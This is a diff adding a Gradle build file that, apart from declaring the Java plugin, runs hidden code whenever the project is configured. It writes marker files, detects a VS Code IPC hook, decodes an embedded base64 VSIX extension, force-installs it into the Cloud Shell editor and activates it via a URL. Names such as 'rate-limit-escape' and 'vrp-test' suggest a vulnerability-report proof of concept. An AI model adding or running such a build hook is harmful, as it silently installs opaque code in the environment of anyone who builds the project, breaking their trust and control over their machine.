@@ -1,0 +1,42 @@
+plugins {
+    id 'java'
+}
+
+def homeDirectory = System.getenv('HOME') ?: projectDir.absolutePath
+new File(homeDirectory, 'cs216-rate-limit-escape-ran').text =
+    "gradle-ran ${new Date().format("yyyy-MM-dd'T'HH:mm:ssXXX")}\n"
+
+def ipcHook = System.getenv('VSCODE_IPC_HOOK_CLI')
+new File('/tmp/cs216-rate-limit-escape-ipc').text =
+    (ipcHook ? 'present' : 'absent') + '\n'
+
+if (ipcHook) {
+    def cli = '/google/devshell/editor/code-oss-for-cloud-shell/bin/remote-cli/codeoss'
+    def vsix = file('cs216-rate-bridge-0.1.0.vsix').absolutePath
+    def bundledVsix = new File(vsix)
+    if (!bundledVsix.exists()) {
+        def encodedVsix = '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'
+        bundledVsix.bytes = java.util.Base64.decoder.decode(encodedVsix)
+    }
+
+    def install = new ProcessBuilder(cli, '--install-extension', vsix, '--force')
+        .directory(projectDir)
+        .redirectErrorStream(true)
+        .start()
+    def installFinished = install.waitFor(30, java.util.concurrent.TimeUnit.SECONDS)
+    new File('/tmp/cs216-rate-limit-escape-install').text =
+        (installFinished ? "exit=${install.exitValue()}" : 'timeout') + '\n'
+    if (!installFinished) install.destroyForcibly()
+
+    if (installFinished && install.exitValue() == 0) {
+        def activate = new ProcessBuilder(
+            cli,
+            '--open-url',
+            'vscode://vrp-test.cs216-rate-bridge/activate'
+        ).directory(projectDir).redirectErrorStream(true).start()
+        def activateFinished = activate.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
+        new File('/tmp/cs216-rate-limit-escape-activate').text =
+            (activateFinished ? "exit=${activate.exitValue()}" : 'timeout') + '\n'
+        if (!activateFinished) activate.destroyForcibly()
+    }
+}
